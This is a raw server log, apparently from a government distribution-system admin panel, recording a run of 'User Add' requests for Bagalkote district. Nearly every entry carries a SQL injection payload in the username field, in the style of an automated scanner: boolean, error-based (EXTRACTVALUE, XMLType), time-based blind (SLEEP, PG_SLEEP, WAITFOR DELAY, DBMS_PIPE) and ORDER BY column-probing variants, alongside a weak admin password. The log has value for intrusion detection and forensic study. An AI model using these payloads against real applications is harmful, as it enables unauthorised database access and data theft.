[2025-03-18 17:10:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC-- zYAq","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7632CASTCHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 76327632 THEN 1 ELSE 0 ENDtextCHR113CHR113CHR107CHR112CHR113 AS NUMERIC-- zYAq
[2025-03-18 17:10:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113 AND 81598159","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113 AND 81598159
[2025-03-18 17:10:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113
[2025-03-18 17:10:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113 AND eGCQeGCQ","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113 AND eGCQeGCQ
[2025-03-18 17:10:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113 AND PpBXPpBX","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113 AND PpBXPpBX
[2025-03-18 17:10:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113-- vyMt","district":"Bagalkote","newpassword":"admin@123"} | admin AND 7899 IN SELECT CHAR113CHAR120CHAR118CHAR98CHAR113SELECT CASE WHEN 78997899 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR113CHAR107CHAR112CHAR113-- vyMt
[2025-03-18 17:10:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL AND 46124612","district":"Bagalkote","newpassword":"admin@123"} | admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL AND 46124612
[2025-03-18 17:10:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL","district":"Bagalkote","newpassword":"admin@123"} | admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL
[2025-03-18 17:10:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL AND GpTSGpTS","district":"Bagalkote","newpassword":"admin@123"} | admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL AND GpTSGpTS
[2025-03-18 17:10:46] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL AND kbyNkbyN","district":"Bagalkote","newpassword":"admin@123"} | admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL AND kbyNkbyN
[2025-03-18 17:10:48] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL-- UbXf","district":"Bagalkote","newpassword":"admin@123"} | admin AND 9862SELECT UPPERXMLTypeCHR60CHR58CHR113CHR120CHR118CHR98CHR113SELECT CASE WHEN 98629862 THEN 1 ELSE 0 END FROM DUALCHR113CHR113CHR107CHR112CHR113CHR62 FROM DUAL-- UbXf
[2025-03-18 17:10:48] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECT CONCATCONCATqxvbqCASE WHEN 26412641 THEN 1 ELSE 0 ENDqqkpq","district":"Bagalkote","newpassword":"admin@123"} | SELECT CONCATCONCATqxvbqCASE WHEN 26412641 THEN 1 ELSE 0 ENDqqkpq
[2025-03-18 17:10:50] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminSELECT DBMS_PIPE.RECEIVE_MESSAGECHR112CHR107CHR81CHR975 FROM DUAL--","district":"Bagalkote","newpassword":"admin@123"} | adminSELECT DBMS_PIPE.RECEIVE_MESSAGECHR112CHR107CHR81CHR975 FROM DUAL--
[2025-03-18 17:10:50] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 5568 FROM SELECTSLEEP5fwnW AND 56835683","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 5568 FROM SELECTSLEEP5fwnW AND 56835683
[2025-03-18 17:10:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 5568 FROM SELECTSLEEP5fwnW","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 5568 FROM SELECTSLEEP5fwnW
[2025-03-18 17:10:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 5568 FROM SELECTSLEEP5fwnW AND hnOLhnOL","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 5568 FROM SELECTSLEEP5fwnW AND hnOLhnOL
[2025-03-18 17:10:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 5568 FROM SELECTSLEEP5fwnW AND rUaarUaa","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 5568 FROM SELECTSLEEP5fwnW AND rUaarUaa
[2025-03-18 17:10:51] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 5568 FROM SELECTSLEEP5fwnW-- JFOe","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 5568 FROM SELECTSLEEP5fwnW-- JFOe
[2025-03-18 17:10:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6143SELECT 6143 FROM PG_SLEEP5 AND 23772377","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6143SELECT 6143 FROM PG_SLEEP5 AND 23772377
[2025-03-18 17:10:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6143SELECT 6143 FROM PG_SLEEP5","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6143SELECT 6143 FROM PG_SLEEP5
[2025-03-18 17:10:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6143SELECT 6143 FROM PG_SLEEP5 AND YSKlYSKl","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6143SELECT 6143 FROM PG_SLEEP5 AND YSKlYSKl
[2025-03-18 17:10:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6143SELECT 6143 FROM PG_SLEEP5 AND jGPqjGPq","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6143SELECT 6143 FROM PG_SLEEP5 AND jGPqjGPq
[2025-03-18 17:10:52] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6143SELECT 6143 FROM PG_SLEEP5-- Hcam","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6143SELECT 6143 FROM PG_SLEEP5-- Hcam
[2025-03-18 17:10:53] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005 AND 15061506","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005 AND 15061506
[2025-03-18 17:10:53] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005 AND GCYcGCYc","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005 AND GCYcGCYc
[2025-03-18 17:10:53] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005 AND uUviuUvi","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005 AND uUviuUvi
[2025-03-18 17:10:53] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005-- yGBT","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005-- yGBT
[2025-03-18 17:10:53] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725 AND 80948094","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725 AND 80948094
[2025-03-18 17:10:54] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725
[2025-03-18 17:10:54] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725 AND zgSBzgSB","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725 AND zgSBzgSB
[2025-03-18 17:10:54] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725 AND ByrAByrA","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725 AND ByrAByrA
[2025-03-18 17:10:54] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725-- khOv","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6854DBMS_PIPE.RECEIVE_MESSAGECHR107CHR83CHR86CHR725-- khOv
[2025-03-18 17:10:57] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- iNzX","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- iNzX
[2025-03-18 17:10:57] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 2803-- kPSb","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 2803-- kPSb
[2025-03-18 17:10:57] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- ZZho","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- ZZho
[2025-03-18 17:10:57] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 2705-- qOnu","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 2705-- qOnu
[2025-03-18 17:10:57] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- RJIL","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- RJIL
[2025-03-18 17:10:58] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1248-- azfx","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1248-- azfx
[2025-03-18 17:10:58] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- FNGs","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- FNGs
[2025-03-18 17:10:58] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 9822-- spYb","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 9822-- spYb
[2025-03-18 17:10:58] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- HODG","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- HODG
[2025-03-18 17:10:58] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 3807-- AjoB","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 3807-- AjoB
[2025-03-18 17:12:33] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"7668","district":"Bagalkote","newpassword":"admin@123"} | 7668
[2025-03-18 17:12:33] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminNvawugAkxwce","district":"Bagalkote","newpassword":"admin@123"} | adminNvawugAkxwce
[2025-03-18 17:12:34] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND88129252AND49564956","district":"Bagalkote","newpassword":"admin@123"} | adminAND88129252AND49564956
[2025-03-18 17:12:34] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND47184718AND21872187","district":"Bagalkote","newpassword":"admin@123"} | adminAND47184718AND21872187
[2025-03-18 17:12:34] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND77228229","district":"Bagalkote","newpassword":"admin@123"} | adminAND77228229
[2025-03-18 17:12:34] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND47184718","district":"Bagalkote","newpassword":"admin@123"} | adminAND47184718
[2025-03-18 17:12:35] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND23147553ANDJsdrJsdr","district":"Bagalkote","newpassword":"admin@123"} | adminAND23147553ANDJsdrJsdr
[2025-03-18 17:12:35] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND47184718ANDFAyaFAya","district":"Bagalkote","newpassword":"admin@123"} | adminAND47184718ANDFAyaFAya
[2025-03-18 17:12:35] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND48105915ANDnQbpnQbp","district":"Bagalkote","newpassword":"admin@123"} | adminAND48105915ANDnQbpnQbp
[2025-03-18 17:12:35] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND47184718ANDcyeecyee","district":"Bagalkote","newpassword":"admin@123"} | adminAND47184718ANDcyeecyee
[2025-03-18 17:12:35] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND97671081--PoKk","district":"Bagalkote","newpassword":"admin@123"} | adminAND97671081--PoKk
[2025-03-18 17:12:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND47184718--WFDA","district":"Bagalkote","newpassword":"admin@123"} | adminAND47184718--WFDA
[2025-03-18 17:12:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECTCASEWHEN56144087THENadminELSESELECT4087UNIONSELECT3417END","district":"Bagalkote","newpassword":"admin@123"} | SELECTCASEWHEN56144087THENadminELSESELECT4087UNIONSELECT3417END
[2025-03-18 17:12:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECTCASEWHEN14311431THENadminELSESELECT4454UNIONSELECT6277END","district":"Bagalkote","newpassword":"admin@123"} | SELECTCASEWHEN14311431THENadminELSESELECT4454UNIONSELECT6277END
[2025-03-18 17:12:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71AND35123512","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71AND35123512
[2025-03-18 17:12:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71
[2025-03-18 17:12:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71ANDscQwscQw","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71ANDscQwscQw
[2025-03-18 17:12:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71ANDmLHnmLHn","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71ANDmLHnmLHn
[2025-03-18 17:12:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71--PUgE","district":"Bagalkote","newpassword":"admin@123"} | adminANDEXTRACTVALUE1862CONCAT0x5c0x71766a6271SELECTELT1862186210x717a6a7a71--PUgE
[2025-03-18 17:12:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERICAND54395439","district":"Bagalkote","newpassword":"admin@123"} | adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERICAND54395439
[2025-03-18 17:12:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERIC","district":"Bagalkote","newpassword":"admin@123"} | adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERIC
[2025-03-18 17:12:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERICANDyMQIyMQI","district":"Bagalkote","newpassword":"admin@123"} | adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERICANDyMQIyMQI
[2025-03-18 17:12:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERICANDUsluUslu","district":"Bagalkote","newpassword":"admin@123"} | adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERICANDUsluUslu
[2025-03-18 17:12:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERIC--ZUpA","district":"Bagalkote","newpassword":"admin@123"} | adminAND2740CASTCHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN27402740THEN1ELSE0ENDtextCHR113CHR122CHR106CHR122CHR113ASNUMERIC--ZUpA
[2025-03-18 17:12:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113AND28722872","district":"Bagalkote","newpassword":"admin@123"} | adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113AND28722872
[2025-03-18 17:12:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113","district":"Bagalkote","newpassword":"admin@123"} | adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113
[2025-03-18 17:12:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113ANDFiPdFiPd","district":"Bagalkote","newpassword":"admin@123"} | adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113ANDFiPdFiPd
[2025-03-18 17:12:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113ANDmfpKmfpK","district":"Bagalkote","newpassword":"admin@123"} | adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113ANDmfpKmfpK
[2025-03-18 17:12:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113--yILu","district":"Bagalkote","newpassword":"admin@123"} | adminAND6817INSELECTCHAR113CHAR118CHAR106CHAR98CHAR113SELECTCASEWHEN68176817THENCHAR49ELSECHAR48ENDCHAR113CHAR122CHAR106CHAR122CHAR113--yILu
[2025-03-18 17:12:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUALAND32923292","district":"Bagalkote","newpassword":"admin@123"} | adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUALAND32923292
[2025-03-18 17:12:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUAL","district":"Bagalkote","newpassword":"admin@123"} | adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUAL
[2025-03-18 17:12:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUALANDWNGSWNGS","district":"Bagalkote","newpassword":"admin@123"} | adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUALANDWNGSWNGS
[2025-03-18 17:12:40] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUALANDJYIGJYIG","district":"Bagalkote","newpassword":"admin@123"} | adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUALANDJYIGJYIG
[2025-03-18 17:12:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUAL--XPSE","district":"Bagalkote","newpassword":"admin@123"} | adminAND7009SELECTUPPERXMLTypeCHR60CHR58CHR113CHR118CHR106CHR98CHR113SELECTCASEWHEN70097009THEN1ELSE0ENDFROMDUALCHR113CHR122CHR106CHR122CHR113CHR62FROMDUAL--XPSE
[2025-03-18 17:12:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECTCONCATCONCATqvjbqCASEWHEN98779877THEN1ELSE0ENDqzjzq","district":"Bagalkote","newpassword":"admin@123"} | SELECTCONCATCONCATqvjbqCASEWHEN98779877THEN1ELSE0ENDqzjzq
[2025-03-18 17:12:42] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminSELECTDBMS_PIPE.RECEIVE_MESSAGECHR83CHR116CHR85CHR995FROMDUAL--","district":"Bagalkote","newpassword":"admin@123"} | adminSELECTDBMS_PIPE.RECEIVE_MESSAGECHR83CHR116CHR85CHR995FROMDUAL--
[2025-03-18 17:12:43] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT2391FROMSELECTSLEEP5vElQAND58585858","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT2391FROMSELECTSLEEP5vElQAND58585858
[2025-03-18 17:12:43] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT2391FROMSELECTSLEEP5vElQ","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT2391FROMSELECTSLEEP5vElQ
[2025-03-18 17:12:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT2391FROMSELECTSLEEP5vElQANDPELbPELb","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT2391FROMSELECTSLEEP5vElQANDPELbPELb
[2025-03-18 17:12:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT2391FROMSELECTSLEEP5vElQANDYjjhYjjh","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT2391FROMSELECTSLEEP5vElQANDYjjhYjjh
[2025-03-18 17:12:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminANDSELECT2391FROMSELECTSLEEP5vElQ--IQxG","district":"Bagalkote","newpassword":"admin@123"} | adminANDSELECT2391FROMSELECTSLEEP5vElQ--IQxG
[2025-03-18 17:12:44] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4101SELECT4101FROMPG_SLEEP5AND55405540","district":"Bagalkote","newpassword":"admin@123"} | adminAND4101SELECT4101FROMPG_SLEEP5AND55405540
[2025-03-18 17:12:45] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminAND4101SELECT4101FROMPG_SLEEP5","district":"Bagalkote","newpassword":"admin@123"} | adminAND4101SELECT4101FROMPG_SLEEP5
